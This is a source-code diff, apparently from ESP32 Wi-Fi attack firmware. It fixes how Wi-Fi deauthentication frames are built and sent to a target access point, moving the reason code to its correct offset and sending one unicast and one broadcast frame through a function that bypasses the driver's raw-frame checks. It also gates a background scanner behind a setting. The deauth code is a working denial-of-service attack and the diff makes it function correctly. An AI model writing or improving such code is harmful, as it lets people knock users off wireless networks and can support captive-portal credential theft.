@@ -2028,6 +2028,7 @@ static void bgWifiScanTask(void* ) {
 }
 
 void startBackgroundScanner() {
+  if (!settings().autoWifiScan) return;
   if (bgScanTaskHandle != nullptr) return;
   xTaskCreatePinnedToCore(
     bgWifiScanTask,
@@ -3065,19 +3066,21 @@ static void cpSendDeauthFrame() {
 
   esp_wifi_set_channel(cp_target_channel, WIFI_SECOND_CHAN_NONE);
 
-  memcpy(cp_deauth_frame, cp_deauth_frame_default, 26);
+  memcpy(cp_deauth_frame, cp_deauth_frame_default, sizeof(cp_deauth_frame_default));
   memcpy(&cp_deauth_frame[10], cp_target_ap.bssid, 6);
   memcpy(&cp_deauth_frame[16], cp_target_ap.bssid, 6);
-  cp_deauth_frame[26] = 7;
-  Deauther::wsl_bypasser_send_raw_frame(cp_deauth_frame, 26);
+  cp_deauth_frame[24] = 7;
+  cp_deauth_frame[25] = 0;
+  Deauther::wsl_bypasser_send_raw_frame(cp_deauth_frame, sizeof(cp_deauth_frame));
 
-  memcpy(cp_deauth_frame, cp_deauth_frame_default, 26);
+  memcpy(cp_deauth_frame, cp_deauth_frame_default, sizeof(cp_deauth_frame_default));
   memcpy(&cp_deauth_frame[10], cp_target_ap.bssid, 6);
   memcpy(&cp_deauth_frame[16], cp_target_ap.bssid, 6);
 
   memset(&cp_deauth_frame[4], 0xFF, 6);
-  cp_deauth_frame[26] = 7;
-  Deauther::wsl_bypasser_send_raw_frame(cp_deauth_frame, 26);
+  cp_deauth_frame[24] = 7;
+  cp_deauth_frame[25] = 0;
+  Deauther::wsl_bypasser_send_raw_frame(cp_deauth_frame, sizeof(cp_deauth_frame));
 
   cp_deauth_packet_count += 2;
 }
@@ -4290,7 +4293,8 @@ void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record, uint8_t c
     memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
     memcpy(&deauth_frame[10], ap_record->bssid, 6);
     memcpy(&deauth_frame[16], ap_record->bssid, 6);
-    deauth_frame[26] = 7;
+    deauth_frame[24] = 7;
+    deauth_frame[25] = 0;
 
     wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame));
 }
